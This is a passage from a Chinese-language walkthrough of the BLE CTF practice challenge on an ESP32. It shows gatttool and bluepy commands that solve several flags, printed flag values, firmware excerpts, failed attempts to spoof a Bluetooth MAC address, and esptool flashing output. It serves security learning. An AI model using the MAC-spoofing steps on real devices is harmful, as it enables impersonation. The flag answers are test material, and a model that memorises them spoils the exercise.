84:E0:F4:03:0F:5E  ACL MTU: 310:10  SCO MTU: 64:8        UP RUNNING         RX bytes:7079 acl:107 sco:0 events:414 errors:0        TX bytes:6887 acl:85 sco:0 commands:214 errors:0\nbdaddr在这里使用bdaddr来对地址进行修改，会显示安装失败，也没有办法找到它的安装包\nsudo apt-get updatesudo apt-get install bluez-utils\n使用bdaddr会简单方便很多，但是它在新版本中好像不存在了方法如下\nsudo hciconfig hci0 downsudo bdaddr -i hci0 11:22:33:44:55:66sudo hciconfig hci0 up\n\n\nbtmgmt这里找到了另外一个工具\n└─$ sudo btmgmt                     [mgmt]# helpMenu mgmt:Available commands:-------------------monitor                                           Advertisement Monitor Submenuselect &lt;index&gt;                                    Select a different indexrevision                                          Get the MGMT Revisioncommands                                          List supported commandsconfig                                            Show configuration infoinfo                                              Show controller infoextinfo                                           Show extended controller infoauto-power                                        Power all available featurespower &lt;on/off&gt;                                    Toggle powered statediscov &lt;yes/no/limited&gt; [timeout]                 Toggle discoverable stateconnectable &lt;on/off&gt;                              Toggle connectable statefast-conn &lt;on/off&gt;                                Toggle fast connectable statebondable &lt;on/off&gt;                                 Toggle bondable statepairable &lt;on/off&gt;                                 Toggle bondable statelinksec &lt;on/off&gt;                                  Toggle link level securityssp &lt;on/off&gt;                                      Toggle SSP modesc &lt;on/off/only&gt;                                  Toggle SC supporths &lt;on/off&gt;                                       Toggle HS supportle &lt;on/off&gt;                                       Toggle LE supportadvertising &lt;on/off&gt;                              Toggle LE advertisingbredr &lt;on/off&gt;                                    Toggle BR/EDR supportprivacy &lt;on/off&gt; [irk]                            Toggle privacy supportclass &lt;major&gt; &lt;minor&gt;                             Set device major/minor classdisconnect [-t type] &lt;remote address&gt;             Disconnect devicecon                                               List connectionsfind [-l|-b] [-L]                                 Discover nearby devicesfind-service [-u UUID] [-r RSSI_Threshold] [-l|-b] Discover nearby servicestop-find [-l|-b]                                 Stop discoveryname &lt;name&gt; [shortname]                           Set local namepair [-c cap] [-t type] &lt;remote address&gt;          Pair with a remote devicecancelpair [-t type] &lt;remote address&gt;             Cancel pairingunpair [-t type] &lt;remote address&gt;                 Unpair devicekeys                                              Load Link Keysltks                                              Load Long Term Keysirks [--local index] [--file file path]           Load Identity Resolving Keysblock [-t type] &lt;remote address&gt;                  Block Deviceunblock [-t type] &lt;remote address&gt;                Unblock Deviceadd-uuid &lt;UUID&gt; &lt;service class hint&gt;              Add UUIDrm-uuid &lt;UUID&gt;                                    Remove UUIDclr-uuids                                         Clear UUIDslocal-oob                                         Local OOB dataremote-oob [-t &lt;addr_type&gt;] [-r &lt;rand192&gt;] [-h &lt;hash192&gt;] [-R &lt;rand256&gt;] [-H &lt;hash256&gt;] &lt;addr&gt; Remote OOB datadid &lt;source&gt;:&lt;vendor&gt;:&lt;product&gt;:&lt;version&gt;         Set Device IDstatic-addr &lt;address&gt;                             Set static addresspublic-addr &lt;address&gt;                             Set public addressext-config &lt;on/off&gt;                               External configurationdebug-keys &lt;on/off&gt;                               Toggle debug keysconn-info [-t type] &lt;remote address&gt;              Get connection informationio-cap &lt;cap&gt;                                      Set IO Capabilityscan-params &lt;interval&gt; &lt;window&gt;                   Set Scan Parametersget-clock [address]                               Get Clock Informationadd-device [-a action] [-t type] &lt;address&gt;        Add Devicedel-device [-t type] &lt;address&gt;                    Remove Deviceclr-devices                                       Clear Devicesbredr-oob                                         Local OOB data (BR/EDR)le-oob                                            Local OOB data (LE)advinfo                                           Show advertising featuresadvsize [options] &lt;instance_id&gt;                   Show advertising size infoadd-adv [options] &lt;instance_id&gt;                   Add advertising instancerm-adv &lt;instance_id&gt;                              Remove advertising instanceclr-adv                                           Clear advertising instancesadd-ext-adv-params [options] &lt;instance_id&gt;        Add extended advertising paramsadd-ext-adv-data [options] &lt;instance_id&gt;          Add extended advertising dataappearance &lt;appearance&gt;                           Set appearancephy [LE1MTX] [LE1MRX] [LE2MTX] [LE2MRX] [LECODEDTX] [LECODEDRX] [BR1M1SLOT] [BR1M3SLOT] [BR1M5SLOT][EDR2M1SLOT] [EDR2M3SLOT] [EDR2M5SLOT][EDR3M1SLOT] [EDR3M3SLOT] [EDR3M5SLOT] Get/Set PHY Configurationwbs &lt;on/off&gt;                                      Toggle Wideband-Speech supportsecinfo                                           Show security informationexpinfo                                           Show experimental featuresexp-debug &lt;on/off&gt;                                Set debug featureexp-privacy &lt;on/off&gt;                              Set LL privacy featureexp-quality &lt;on/off&gt;                              Set bluetooth quality report featureexp-offload &lt;on/off&gt;                              Toggle codec supportread-sysconfig                                    Read System Configurationset-sysconfig &lt;-v|-h&gt; [options...]                Set System Configurationget-flags [-t type] &lt;address&gt;                     Get device flagsset-flags [-f flags] [-t type] &lt;address&gt;          Set device flagsmenu &lt;name&gt;                                       Select submenuversion                                           Display versionquit                                              Quit programexit                                              Quit programhelp                                              Display help about this programexport                                            Print environment variablesscript &lt;filename&gt;      \n\n使用方法如下\n# 1. 进入 btmgmt 交互模式sudo btmgmt# 2. 选择适配器select hci0# 3. 关闭电源power off# 等待确认# 4. 设置静态地址set-static-addr 11:22:33:44:55:66# 观察是否报错# 5. 打开电源power on# 等待确认# 6. 查看信息确认info# 检查输出中的 &quot;current settings&quot; 部分，看 public address 或 static address 是否改变# 注意：&#x27;info&#x27; 命令可能仍然显示硬件的公共地址，但连接时使用的地址可能已经变成静态地址了。# 7. 退出exit# 8. 尝试连接目标设备sudo bluetoothctlconnect 64:B7:08:61:B9:7E# 检查目标设备上的状态是否按预期改变\n\n\n\n这段时间的部分日志从这几分日志可以得到：当前的蓝牙适配器 (hci0, CSR8510 A10) 和其驱动程序组合，不支持通过 btmgmt 工具的 public-addr 或 set-static-addr 命令来伪装 MAC 地址。btmon\n= Close Index: 84:E0:F4:03:0F:5E                                                                         [hci0] 5495.330780btmgmt[193534]: @ MGMT Command: Set Public Address (0x0039) plen 6                              &#123;0x0002&#125; [hci0] 5555.288257        Address: 11:22:33:44:55:66 (OUI 11-22-33)@ MGMT Event: Command Status (0x0002) plen 3                                                    &#123;0x0002&#125; [hci0] 5555.288272      Set Public Address (0x0039)        Status: Not Supported (0x0c)btmgmt[193534]: @ MGMT Command: Set Powered (0x0005) plen 1                                     &#123;0x0002&#125; [hci0] 5574.242334        Powered: Enabled (0x01)= Open Index: 84:E0:F4:03:0F:5E      \nbtmgmt\n[mgmt]# select hci0Selected index 0[hci0]# power off[hci0]# hci0 Set Powered complete, settings: bondable ssp br/edr le secure-conn [hci0]# hci0 class of device changed: 0x000000[hci0]# set-static-addr 11:22:33:44:55:66Invalid command in menu mgmt: set-static-addrUse &quot;help&quot; for a list of available commands in a menu.Use &quot;menu &lt;submenu&gt;&quot; if you want to enter any submenu.Use &quot;back&quot; if you want to return to menu main.[hci0]# public-addr 11:22:33:44:55:66[hci0]# Set Public Address for hci0 failed with status 0x0c (Not Supported)[hci0]# power on                                                                                        [hci0]# hci0 class of device changed: 0x7c0000[hci0]# hci0 Set Powered complete, settings: powered bondable ssp br/edr le secure-conn [hci0]# info[hci0]# hci0:   Primary controller[hci0]#         addr 84:E0:F4:03:0F:5E version 6 manufacturer 10 class 0x7c0000[hci0]#         supported settings: powered connectable fast-connectable discoverable bondable link-security ssp br/edr le advertising secure-conn debug-keys privacy static-addr phy-configuration [hci0]#         current settings: powered bondable ssp br/edr le secure-conn [hci0]#         name kali[hci0]#         short name \n\nifconnfig来自：在 Linux 上，您可以使用命令 sudo hciconfig hci0 down 将蓝牙设备关闭，使用 sudo hciconfig hci0 hw ether NEW_MAC_ADDRESS 修改 MAC 地址，再用 sudo hciconfig hci0 up 重新启动设备这个试了，不行\nsudo hciconfig hci0 downsudo hciconfig hci0 hw ether 11:22:33:44:55:66sudo hciconfig hci0 up\n\n代码也不行\nimport subprocessdef change_bluetooth_mac(new_mac):    # 关闭设备    subprocess.call([&quot;sudo&quot;, &quot;hciconfig&quot;, &quot;hci0&quot;, &quot;down&quot;])        # 修改 MAC 地址    subprocess.call([&quot;sudo&quot;, &quot;hciconfig&quot;, &quot;hci0&quot;, &quot;up&quot;])    subprocess.call([&quot;sudo&quot;, &quot;hciconfig&quot;, &quot;hci0&quot;, &quot;up&quot;, new_mac])        # 重新启动设备    subprocess.call([&quot;sudo&quot;, &quot;hciconfig&quot;, &quot;hci0&quot;, &quot;up&quot;])new_mac = &quot;11:22:33:44:55:66&quot;  # 需要替换为新的 MAC 地址change_bluetooth_mac(new_mac)\n\n\n\n物理修改找到了篇文章：https://zhuanlan.zhihu.com/p/633839213等新的蓝牙适配器到了就来更新\n0x16 设置MTU%% 阅读 handle 0x0048 并按照它所说的去做。设置 MTU 可能是一项棘手的事情。一些工具可能会提供 mtu 标志，但它们似乎并没有真正触发服务器上的 MTU 协商。尝试使用 gatttool 的交互模式来完成此任务。默认情况下，BLECTF 服务器设置为强制 MTU 大小为 20。服务器将监听 MTU 协商并查看它们，但我们并没有真正更改代码中的 MTU。如果您使用 handle 0x0048 中指定的值触发 MTU 事件，我们只触发标志代码。祝你好运！ %%\n读取要求注意这里应该是0x004e\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nSet your connection MTU to 444\n\nATT MTU 协商: MTU 的大小是在连接建立后由客户端和服务器自动协商的。客户端会告知服务器它能支持的最大 MTU，服务器也会告知客户端它能支持的最大 MTU，最终双方会选择一个两者都能接受的最小值作为本次连接实际使用的 MTU。\ngatttool的交互模式下有**mtu &lt;value&gt; 命令**，可以用来发起 MTU 交换请求。┌───(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Set your connection MTU to 444┌───(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E -I[64:B7:08:61:B9:7E][LE]&gt; connectAttempting to connect to 64:B7:08:61:B9:7EConnection successful[64:B7:08:61:B9:7E][LE]&gt; mtuUsage: mtu &lt;value&gt;[64:B7:08:61:B9:7E][LE]&gt; mtu 444 MTU was exchanged successfully: 444[64:B7:08:61:B9:7E][LE]&gt; char-read-hnd 0x004eCharacteristic value/descriptor: 62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38 [64:B7:08:61:B9:7E][LE]&gt; ┌───(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;b1e409e5a4eaf9fe5158\n得到62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38 b1e409e5a4eaf9fe5158\n\n使用bluepy库# -*- coding: utf-8 -*-import sysfrom bluepy import btleDEVICE_ADDRESS = &quot;64:B7:08:61:B9:7E&quot;ADDR_TYPE = btle.ADDR_TYPE_PUBLICREQUESTED_MTU = 444# 用于检查结果的状态句柄 (从源码看是 0xFF13 的值句柄)CHECK_HANDLE = 0x004e # IDX_CHAR_FLAG_MTU + 1 (假设)print(f&quot;Connecting to &#123;DEVICE_ADDRESS&#125;...&quot;)conn = Nonetry:    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)    print(&quot;Connected.&quot;)    print(f&quot;Requesting MTU size: &#123;REQUESTED_MTU&#125;&quot;)    try:        # 尝试设置 MTU        conn.setMTU(REQUESTED_MTU)        print(f&quot;MTU exchange likely completed (actual MTU depends on server).&quot;)        # 注意：setMTU 不会返回实际协商的 MTU，        # Bluepy 没有标准方法直接获取协商后的 MTU。        # 但请求已经发出。        # 等待片刻让设备可能更新状态        import time        time.sleep(1)        # 读取状态句柄检查结果        print(f&quot;Reading check handle &#123;hex(CHECK_HANDLE)&#125; to verify...&quot;)        result_value = conn.readCharacteristic(CHECK_HANDLE)        print(f&quot;Value read from check handle: &#123;result_value.hex()&#125; (&#123;result_value!r&#125;)&quot;)        # 在这里判断 result_value 是否变成了预期的成功值        # 例如，源码中是 &quot;b1e409e5a4eaf9fe5158&quot;        if result_value == b&quot;b1e409e5a4eaf9fe5158&quot;:            print(&quot;SUCCESS: Check handle value indicates MTU challenge likely completed!&quot;)        else:            print(&quot;Check handle value did not match expected success value.&quot;)    except btle.BTLEException as e:        print(f&quot;Error during MTU request or subsequent read: &#123;e&#125;&quot;)except btle.BTLEException as e:    print(f&quot;Connection failed or Bluetooth error: &#123;e&#125;&quot;)finally:    if conn:        conn.disconnect()        print(&quot;Disconnected.&quot;)\n\n\n也成功了\n┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Set your connection MTU to 444┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ sudo python test7.pyConnecting to 64:B7:08:61:B9:7E...Connected.Requesting MTU size: 444MTU exchange likely completed (actual MTU depends on server).Reading check handle 0x4e to verify...Value read from check handle: 6231653430396535613465616639666535313538 (b&#x27;b1e409e5a4eaf9fe5158&#x27;)SUCCESS: Check handle value indicates MTU challenge likely completed!Disconnected.  ┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;b1e409e5a4eaf9fe5158\n\n这次没有办法通过重新写入0x004e来改变0x004e的值，可以选择把esp32断电（从电脑拔出）再插回去，它就会初始化了，可以这样来进行多种方法的测试\n\n0x17 写入响应ack信息%% 查看 处理 0x0050 并按照它所说的去做。此 chalange 与其他写入 chalange 不同，因为执行写入的工具需要正确实现写入响应 ack 消息。这个标志也很棘手，因为即使没有 “NOTIFY” 属性，该标志也会作为通知响应数据返回。 %%\n读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nWrite+resp ‘hello’GATT特征的写入类型与响应机制\n\n写入带响应（Write with Response）  特征属性中GATT_PROP_WRITE（0x08）表示写入操作需要服务器返回确认响应（ACK），客户端写入后必须等待服务器确认写入成功。\n写入无响应（Write without Response）  属性GATT_PROP_WRITE_NO_RSP（0x04）允许客户端写入后不等待确认，提升效率但不保证写入成功。本题强调“写入工具需要正确实现写入响应ACK”，说明目标特征支持带响应的写入，客户端必须处理写入确认包。查看help,这次使用–char-write来写--char-write                              Characteristics Value Write Without Response (Write Command)--char-write-req                          Characteristics Value Write (Write Request)\n\n操作\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0050 -n $(echo -n &quot;hello&quot;|xxd -ps)\n\n结果\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Write+resp &#x27;hello&#x27;  ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0050 -n $(echo -n &quot;hello&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;d41d8cd98f00b204e980   \n\n0x18 固件 is boss%% 看看 handle 0x0052。请注意，它没有 notify 属性。在这里写个字，无论如何都要听通知！事情并不总是像看起来那样！ %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0052 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nNo notifications here! really?向0x0052写入任意数据然后听0x0052的notify先检查目标句柄的属性0000 1010，只有读写两种属性\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b  64:B7:08:61:B9:7E --characteristics |grep  &quot;0x0052&quot;handle = 0x0051, char properties = 0x0a, char value handle = 0x0052, uuid = 0000ff15-0000-1000-8000-00805f9b34fb\n按照0x11的方法继续听notify\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0052 -n 01 --listen\n\n听到了\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0052 -n 01 --listenCharacteristic value was written successfullyNotification handle = 0x0052 value: 66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62 ┌──(kali㉿kali)-[~/Desktop]└─$ echo &quot;66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot; | tr -d &#x27; &#x27; | xxd -r -p             fc920c68b6006169477b                                                                                                      \n\n为什么没有notify属性还是会发送notify呢这是源码部分代码会强制发送一个通知 (Notification) (因为 esp_ble_gatts_send_indicate 最后一个参数是 false)。\n// notify hidden notify flagif (blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]+1 == param-&gt;write.handle) // 检查是否写入 0x0052&#123;    // indicate_handle_state = blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]; // 这行可能是遗留代码或用于其他目的    char notify_data[20] = &quot;fc920c68b6006169477b&quot;; // &lt;-- 要发送的通知数据 (Flag?)    // 重置句柄 0x0052 的值为初始指令    esp_ble_gatts_set_attr_value(blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]+1, sizeof(hidden_notify_value)-1, (uint8_t *)hidden_notify_value);    // 发送通知！即使属性没声明 Notify，也强制发送    esp_ble_gatts_send_indicate(gatts_if, param-&gt;write.conn_id, blectf_handle_table[IDX_CHAR_VAL_FLAG_HIDDEN_NOTIFY], sizeof(notify_data), (uint8_t *)notify_data, false); // false = Notification&#125;\n\n\n为什么可以这样设置，为什么没有notify属性依然能接收到notify信息固件拥有最终控制权: 蓝牙协议栈（如 ESP-IDF 中的 BlueZ 衍生栈）提供了发送 GATT 操作（如通知、指示、读写响应）的 API 函数（例如 esp_ble_gatts_send_indicate）。设备端的应用程序（固件）代码可以在任何它认为合适的时机调用这些函数。固件开发者决定了设备的实际行为。 如果开发者编写代码，在收到对句柄 A 的写请求后，就调用函数向客户端发送一个关于句柄 B 的通知，那么设备就会这样做，即使句柄 B 的特征声明中没有 Notify 属性。固件可以不完全遵守自己声明的属性.\n0x19 小总结%% 查看 0x0054 上的所有 handle 属性！四处逛逛，找到你国旗的碎片。 %%先检查属性\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b  64:B7:08:61:B9:7E --characteristics |grep  &quot;0x0054&quot;       handle = 0x0053, char properties = 0x9b, char value handle = 0x0054, uuid = 0000ff16-0000-1000-8000-00805f9b34fb\n0x9b&#x3D;10011011对照这个表\n\n\n\n属性\n十六进制值\n二进制位\n说明\n\n\n\nBroadcast\n0x01\n0000 0001\n广播\n\n\nRead\n0x02\n0000 0010\n允许读取\n\n\nWrite Without Resp\n0x04\n0000 0100\n允许无响应写入\n\n\nWrite\n0x08\n0000 1000\n允许带响应写入\n\n\nNotify\n0x10\n0001 0000\n允许通知\n\n\nIndicate\n0x20\n0010 0000\n允许指示\n\n\nAuthenticated Write\n0x40\n0100 0000\n认证写入\n\n\nExtended Properties\n0x80\n1000 0000\n扩展属性\n\n\n那么要关注的属性就是\n\n\n\n\n\n扩展属性、notify、write、read、broadcast\n\n\n\n\n\n一个个看\n\n\n\n\n\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0054 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;So many properties!┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write -a 0x0054 -n 01 --listen^C┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0054 -n 01 --listenCharacteristic value was written successfullyNotification handle = 0x0054 value: 30 37 65 34 61 30 63 63 34 38 ^C┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0054 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;fbb966958f┌──(kali㉿kali)-[~/Desktop]└─$ echo &quot;30 37 65 34 61 30 63 63 34 38 &quot; | tr -d &#x27; &#x27; | xxd -r -p 07e4a0cc48  \n\n拼接起来就好了fbb966958f07e4a0cc48这里运用的指令都是前面出现过的，还记得怎么用就行\n0x20%% 找出作者的 twitter 句柄并按照 0x0056 告诉您的去做！ %%\n读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\n作者的twitter是hackgnar\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;md5 of author&#x27;s twitter handle┌──(kali㉿kali)-[~/Desktop]└─$ echo -n &quot;hackgnar&quot; | md5sumfe40eb2449bda7f9a997331ac09424e7  -┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0056 -n $(echo -n &quot;fe40eb2449bda7f9a997&quot;|xxd -ps)Characteristic value was written successfully                                                                                                        ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;fe40eb2449bda7f9a997                      \n\n但是答案是d953bfb9846acc2e15ee这个答案只有前20个字符又很难还原最初的是什么\n记录报错安装时报错直接使用系统的esptool可能会报错（指安装途径为sudo apt-get install esptool)\n┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]└─$ esptool -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.binesptool.py v4.7.0Serial port /dev/ttyUSB0Connecting....Chip is ESP32-D0WDQ6 (revision v1.1)Features: WiFi, BT, Dual Core, 240MHz, VRef calibration in efuse, Coding Scheme NoneCrystal is 40MHzMAC: 8c:4f:00:c8:78:60Traceback (most recent call last):  File &quot;/usr/bin/esptool&quot;, line 37, in &lt;module&gt;    esptool._main()    ~~~~~~~~~~~~~^^  File &quot;/usr/lib/python3/dist-packages/esptool/__init__.py&quot;, line 1139, in _main    main()    ~~~~^^  File &quot;/usr/lib/python3/dist-packages/esptool/__init__.py&quot;, line 751, in main    esp = esp.run_stub()  File &quot;/usr/lib/python3/dist-packages/esptool/loader.py&quot;, line 996, in run_stub    stub = StubFlasher(get_stub_json_path(self.CHIP_NAME))  File &quot;/usr/lib/python3/dist-packages/esptool/loader.py&quot;, line 159, in __init__    with open(json_path) as json_file:         ~~~~^^^^^^^^^^^FileNotFoundError: [Errno 2] No such file or directory: &#x27;/usr/lib/python3/dist-packages/esptool/targets/stub_flasher/stub_flasher_32.json&#x27;                                                                                                 \n\n安装esptool\npip install esptool -i https://pypi.tuna.tsinghua.edu.cn/simple\n然后从git安装esptool.py\ngit clone https://github.com/espressif/esptool.git\n尝试启动esptool.py\npython &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -h   \n\n如果报错\n┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -hTraceback (most recent call last):  File &quot;/home/kali/Desktop/esptool/esptool.py&quot;, line 34, in &lt;module&gt;    import esptool  File &quot;/home/kali/Desktop/esptool/esptool/__init__.py&quot;, line 41, in &lt;module&gt;    import rich_click as clickModuleNotFoundError: No module named &#x27;rich_click&#x27;\n就去安装这个缺少的库\npip install rich-click -i https://pypi.tuna.tsinghua.edu.cn/simple\n接着就可以直接运行了\npython &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin\n效果如下\n ┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -h                                                                                                               Usage: esptool.py [OPTIONS] COMMAND [ARGS]...                                                                                                                                             esptool.py v4.8.1 - serial utility for flashing, provisioning, and interacting with          Espressif SoCs.                                                                                                                                                                          ╭─ Options ─────────────────────────────────────────────────────────────────────────────────╮│ --chip              -c  [auto|esp8266|esp32|esp32s2|esp  Target chip type.                ││                         32s3|esp32c3|esp32c2|esp32c6|es                                   ││                         p32c61|esp32c5|esp32h2|esp32h21                                   ││                         |esp32p4|esp32h4]                                                 ││ --port              -p  TEXT                             Serial port device.              ││ --baud              -b  INTEGER                          Serial port baud rate used when  ││                                                          flashing/reading.                ││ --port-filter           [TEXT]                           Serial port device filter, can   ││                                                          be vid=NUMBER, pid=NUMBER,       ││                                                          name=SUBSTRING,                  ││                                                          serial=SUBSTRING.                ││ --before                [default-reset|usb-reset|no-res  Which reset to perform before    ││                         et|no-reset-no-sync]             connecting to the chip.          ││ --after             -a  [hard-reset|soft-reset|no-reset  Which reset to perform after     ││                         |no-reset-stub|watchdog-reset]   operation is finished.           ││ --no-stub                                                Disable launching the flasher    ││                                                          stub, only talk to ROM           ││                                                          bootloader. Some features will   ││                                                          not be available.                ││ --trace             -t                                   Enable trace-level output of     ││                                                          esptool.py interactions.         ││ --override-vddsdio      [1.8V|1.9V|OFF]                  Override ESP32 VDDSDIO internal  ││                                                          voltage regulator (use with      ││                                                          care).                           ││ --connect-attempts      INTEGER                          Number of attempts to connect,   ││                                                          negative or 0 for infinite.      ││                                                          Default: 7.                      ││ --help              -h                                   Show this message and exit.      │╰───────────────────────────────────────────────────────────────────────────────────────────╯╭─ Basic commands ──────────────────────────────────────────────────────────────────────────╮│ write-flash             Write a binary blob to flash. The address is followed by binary   ││                         filename, separated by space.                                     ││ read-flash              Read SPI flash memory content.                                    ││ erase-flash             Erase the SPI flash memory.                                       ││ erase-region            Erase a region of the SPI flash memory.                           ││ read-mac                Print the device MAC address.                                     ││ flash-id                Print the SPI flash memory manufacturer and device ID.            ││ elf2image               Create an application image from ELF file                         ││ image-info              Print information about a firmware image (bootloader or           ││                         application).                                                     ││ merge-bin               Merge multiple raw binary files into a single flashable file.     ││ version                 Print esptool version.                                            │╰───────────────────────────────────────────────────────────────────────────────────────────╯╭─ Advanced commands ───────────────────────────────────────────────────────────────────────╮│ verify-flash            Verify a binary blob against the flash memory content.            ││ load-ram                Download an image to RAM and execute.                             ││ dump-mem                Dump arbitrary memory to a file.                                  ││ read-mem                Read arbitrary memory location.                                   ││ write-mem               Modify or write to arbitrary memory location.                     ││ read-flash-status       Read SPI flash memory status register.                            ││ write-flash-status      Write SPI flash memory status register.                           ││ read-flash-sfdp         Read SPI flash SFDP (Serial Flash Discoverable Parameters).       ││ get-security-info       Print security information report.                                ││ chip-id                 Print the device chip ID.                                         ││ run                     Run application code loaded in flash.                             │╰───────────────────────────────────────────────────────────────────────────────────────────╯                                                                                             ┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.binWarning: Deprecated: Option &#x27;--flash_mode&#x27; is deprecated. Use &#x27;--flash-mode&#x27; instead.Warning: Deprecated: Option &#x27;--flash_size&#x27; is deprecated. Use &#x27;--flash-size&#x27; instead.Warning: Deprecated: Option &#x27;--flash_freq&#x27; is deprecated. Use &#x27;--flash-freq&#x27; instead.Warning: Deprecated: Choice &#x27;default_reset&#x27; for option &#x27;--before&#x27; is deprecated. Use &#x27;default-reset&#x27; instead.Warning: Deprecated: Choice &#x27;hard_reset&#x27; for option &#x27;--after&#x27; is deprecated. Use &#x27;hard-reset&#x27; instead.Warning: Deprecated: Command &#x27;write_flash&#x27; is deprecated. Use &#x27;write-flash&#x27; instead.esptool.py v4.8.1Connected to ESP32 on /dev/ttyUSB0:Chip type:          ESP32-D0WDQ6 (revision v1.1)Features:           Wi-Fi, BT, Dual Core + LP Core, 240MHz, Vref calibration in eFuse, Coding Scheme NoneCrystal frequency:  40MHzMAC:                8c:4f:00:c8:78:60Stub flasher running.Changing baud rate to 460800...Changed.Configuring flash size...Flash will be erased from 0x00001000 to 